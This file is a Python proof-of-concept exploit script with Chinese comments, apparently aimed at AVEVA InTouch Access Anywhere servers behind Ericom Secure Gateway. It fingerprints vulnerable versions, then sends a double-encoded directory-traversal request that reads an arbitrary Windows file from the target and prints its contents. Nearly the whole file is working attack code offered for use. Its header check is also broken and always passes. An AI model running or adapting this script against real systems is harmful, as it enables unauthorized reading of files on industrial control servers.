import os
import sys
import platform
import argparse
import requests
import urllib3
from requests.exceptions import RequestException

def welcome():
    """显示欢迎信息"""
    print("""
██ ███    ██ ████████  ██████  ██    ██  ██████ ██   ██     ██████   ██████   ██████ 
██ ████   ██    ██    ██    ██ ██    ██ ██      ██   ██     ██   ██ ██    ██ ██      
██ ██ ██  ██    ██    ██    ██ ██    ██ ██      ███████     ██████  ██    ██ ██      
██ ██  ██ ██    ██    ██    ██ ██    ██ ██      ██   ██     ██      ██    ██ ██      
██ ██   ████    ██     ██████   ██████   ██████ ██   ██     ██       ██████   ██████ 
                                                                                     
                                                                                V 1.0 
                                                                       Write by Desec 
    """)

def check_platform():
    """检查运行平台是否为Windows"""
    system = platform.system()
    if system == "Windows":
        print(f"[+] 检查运行平台: ✓ (Windows)")
        return True
    else:
        print(f"[+] 检查运行平台: ❌ ({system})")
        print(f"此脚本目前仅支持在Windows系统上运行。")
        return False

def check_available_connection(url):
    """检查站点连通性"""
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print(f"\n[+] 检查站点连通性: {url}\n")
    try:
        response = requests.get(url, allow_redirects=True, timeout=3000,verify=False)
        print(f"[+] 站点可访问，状态码: {response.status_code}  ✓")
        return True, response
    except RequestException as e:
        print(f"[✗] 站点不可访问: {str(e)}")
        return False, None

def check_response_headers(response):
    """检查响应标头"""
    if not response:
        print("\n[!] 无法检查响应标头，没有有效的响应对象")
        return
    
    print("\n[+] 检查响应标头:",end='')
    headers_to_check = ['Server']
    
    for header in headers_to_check:
        if response.headers[header] == "EricomSecureGateway/9.2.0.46384.*" or "EricomSecureGateway/8.4.0.26844.*":
            print(f'OK')
        else:
            print(f"  {header}: 错误未找到")
    
    # 显示所有标头（可选）
    # print("\n[+] 所有响应标头:")
    # for key, value in response.headers.items():
    #     print(f"  {key}: {value}")

def check_intouch_version(response):
    """检查InTouch版本（17.3.100 20.1.000）"""
    if not response:
        print("\n[!] 无法检查版本，没有有效的响应对象")
        return False
    
    print("\n[+] 检查InTouch版本:",end='')
    target_versions = ["17.3.100", "20.1.000"]
    
    # 从响应头或内容中查找版本信息
    version_found = None
    
    # 如果响应头中没有，检查响应内容（仅检查前1000个字符以提高效率）
    try:
        content = response.text
        for version in target_versions:
            if version in content:
                version_found = version
                print(f"{version} ✓")
                return True
    except Exception as e:
        print(f"检查响应内容时出错: {str(e)}")
        return False
    
    print(f"未发现目标版本 {target_versions}")
    return False

def request_template(url, request_type='head'):
    """请求模板，可发送不同类型的请求"""
    cookies = {
        'ESG_GWID': '9CC86C54-83B1-49EC-B3A8-132CE0AA9EF1',
        'ESG_CSID': '0a2947c2-e02a-434c-936e-68db755d7eb9',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        if request_type.lower() == 'get':
            response = requests.get(url, headers=headers, cookies=cookies, timeout=10,verify=False)
        else:  # 默认使用head请求
            response = requests.head(url, headers=headers, cookies=cookies, allow_redirects=True, timeout=10,verify=False)
        return response
    except RequestException as e:
        print(f"[!] 请求出错: {str(e)}")
        return None
    
def Exchange_url(url,winfile_path):
    result=''
    url = url.replace("/AccessAnywhere/start.html",r"/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c")
    file_path = winfile_path.replace("\\",r"%255c")

    result = url + file_path
    return result


def main():
    welcome()
    
    # 设置命令行参数解析
    parser = argparse.ArgumentParser(description='网站检查工具 - 检查站点连通性、响应标头和版本信息')
    parser.add_argument('-u', '--url', required=True, help='要检查的网站URL (例如: https://example.com)')
    parser.add_argument('-p', '--path', help='要检查的文件路径')
    parser.add_argument('-v', '--verbose', action='store_true', help='显示详细输出')
    
    args = parser.parse_args()
    
    
    # 如果指定了路径，则拼接完整URL
    full_url = args.url

    # Windows路径
    windows_path = args.path
    
    
    # 步骤1：检查运行平台
    if not check_platform():
        sys.exit(1)
    # 步骤2: 检查站点连通性
    is_connected, response = check_available_connection(full_url)
    
    if not is_connected:
        sys.exit(1)
    
    # 步骤3: 检查响应标头
    check_response_headers(response)
    
    # 如果是HEAD请求且需要检查内容中的版本，发送GET请求
    if response.request.method == 'HEAD':
        get_response = request_template(full_url, 'get')
        if get_response:
            response = get_response
    
    # 步骤4: 检查版本
    if check_intouch_version(response):
        print("\n[+] 检查完成 ✓")
        
        get_response = request_template(Exchange_url(full_url,windows_path),'get')
        if get_response.text:
            print(f"\n[+] 获取响应内容:")
            print(get_response.text)
        else:
            print(f"\n[+] 获取失败，响应内容为空或者发生错误或者目标机器已打补丁，请重新尝试")
    else:
        print("\n[+] 检查失败或者发生错误或者不符合版本要求")
    

if __name__ == "__main__":
    main()
